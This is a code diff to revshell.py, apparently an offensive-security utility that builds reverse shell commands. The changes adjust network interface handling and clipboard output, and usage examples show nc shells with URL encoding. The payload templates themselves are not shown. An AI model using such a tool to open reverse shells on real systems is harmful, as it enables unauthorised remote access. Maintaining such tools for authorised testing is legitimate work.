@@ -48,7 +48,7 @@ parser = argparse.ArgumentParser(description=f'''{help_subtitle}\n{help_default_
 python3 revshell.py -i 10.13.3.7 -p 9001 -t nc -e url-all
 python3 revshell.py -p 1337''', formatter_class=RawTextHelpFormatter)
 
-parser.add_argument('-i', '--ip', type=str, metavar='', default = "tun0", help='Specify the IP address you want to listen on.')
+parser.add_argument('-i', '--ip', type=str, metavar='', help='Specify the IP address you want to listen on.')
 parser.add_argument('-p', '--port', type=str, metavar = '', default="443", help='The port you want to listen on.')
 parser.add_argument('-s', '--shell', type=str, metavar = '', default = "/bin/sh", help='Which shell you want to use (e.g. /bin/bash, /bin/sh, etc.)')
 parser.add_argument('-t', '--rev-type', type=str, metavar = '', default = "bash", help='The kind of reverse shell you would like (e.g. perl, python, nc, etc.)')
@@ -92,14 +92,20 @@ class shells():
         if bool(re.match(str(ip), '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'))==False: # True when user enters interface
              
             interfaces = ['eth0','eth1','wlan0','ppp0','lo','vboxnet0','pan0','vmnet1','vmnet8','tun0']
-            if(ip.lower() in interfaces):
-                try:
-                    ip = ni.ifaddresses(ip)[ni.AF_INET][0]['addr']
-                except ValueError:
+            ip = str(ip)
+            #if(ip.lower() in interfaces):
+            try:
+                ip = ni.ifaddresses(ip)[ni.AF_INET][0]['addr']
+            except ValueError:
+                if(ip.lower() == "tun0"):
+                    cprint("tun0 was not found! Defaulting to eth0.\n","red")
                     ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
-                except Exception:
-                    sys.exit("Please specify an ip address or interface.")
-        
+                else:
+                    cprint("Specified interface was not found, or no ip specified. Defaulting to eth0.\n","red")
+                    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            except Exception as e:
+                print(e)
+                sys.exit("Please specify an ip address or interface.")
         # Coloring messes up output unless initialized with coloram.
         # Couldn't find a way to make it work with encoding
         if not encode and not clipboard:
@@ -164,8 +170,8 @@ if __name__ == '__main__':
     arguments = shells(ip,port,rev_type,encode)
 
 if clipboard:
-    cprint("The reverse shell has been copied to your system clipboard.","green")
-    sys.exit(pyperclip.copy(arguments.reverse_shell()))
+    pyperclip.copy(arguments.reverse_shell())
+    sys.exit(cprint("The reverse shell has been copied to your system clipboard.","green"))
 if len(sys.argv) > 1 and not raw:
     sys.exit(arguments.reverse_shell())
 elif raw:
